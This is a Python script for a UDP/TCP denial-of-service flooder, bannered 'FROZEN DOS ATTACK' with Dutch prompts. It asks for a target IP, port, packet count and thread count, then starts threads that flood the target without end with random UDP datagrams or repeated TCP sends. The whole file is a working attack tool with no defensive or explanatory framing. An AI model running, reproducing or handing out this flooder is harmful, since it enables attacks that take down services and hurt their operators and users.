import signal
import socket
import random
import threading
import sys
import os
import ipaddress

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def red_print(text):
    red = "\033[31m"
    reset = "\033[0m"
    print(red + text + reset)

def byebye():
    clear()
    os.system("figlet Doei :( -f slant")
    sys.exit(130)

clear()

banner = '''\033[31m
 _____ ____   ___ __________ _   _   ____   ___  ____ 
|  ___|  _ \ / _ \__  / ____| \ | | |  _ \ / _ \/ ___| 
| |_  | |_) | | | |/ /|  _| |  \| | | | | | | | \___ \ 
|  _| |  _ <| |_| / /_| |___| |\  | | |_| | |_| |___) |
|_|   |_| \_\\___/____|_____|_| \_| |____/ \___/|____/ 

    _  _____ _____  _    ____ _  __
   / \|_   _|_   _|/ \  / ___| |/ /
  / _ \ | |   | | / _ \| |   | ' / 
 / ___ \| |   | |/ ___ \ |___| . \ 
/_/   \_\_|   |_/_/   \_\____|_|\_\ 
\033[0m'''

print(banner)

try:
    ip = str(input("Smack IP Hier: "))
    ipaddress.ip_address(ip)
    port = int(input("Port: "))
    if port < 1 or port > 65535:
        raise ValueError("Beetje hoogte aan de port?")
except ValueError as e:
    print(f"Error: {e}")
    sys.exit(1)

choice = str(input("UDP(y/n): "))
times = int(input("Pakketjes per connectie: "))
threads = int(input("Threads: "))

final_banner = f'''
                             \033[31m_____ ____   ___ __________ _   _  
                            |  ___|  _ \ / _ \__  / ____| \ | |
                            | |_  | |_) | | | |/ /|  _| |  \| |
                            |  _| |  _ <| |_| / /_| |___| |\  |
                            |_|   |_| \_\___/____|_____|_| \_|\033[0m

                \033[31m╔═══════════════════════════════════════════════════════\033[0m
                \033[31m║ TARGET      : [{ip}]                       ║\033[0m
                \033[31m║ PORT        : [{port}]                                   ║\033[0m
                \033[31m║ METHOD      : UDP                                    ║\033[0m
                \033[31m╚═══════════════════════════════════════════════════════\033[0m
'''

clear()
red_print(final_banner)

def run():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
        except:
            s.close()
            print("[!] Error!!!")

def run2():
    data = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("Verzonden!!!")
        except:
            s.close()
            print("[*] Error")

for y in range(threads):
    if choice.lower() == 'y':
        th = threading.Thread(target=run)
        th.start()
    else:
        th = threading.Thread(target=run2)
        th.start()

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)
    try:
        exitc = str(input("Ga je me echt verlaten : ( (y/n)?: "))
        if exitc.lower() == 'y':
            byebye()
    except KeyboardInterrupt:
        byebye()
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
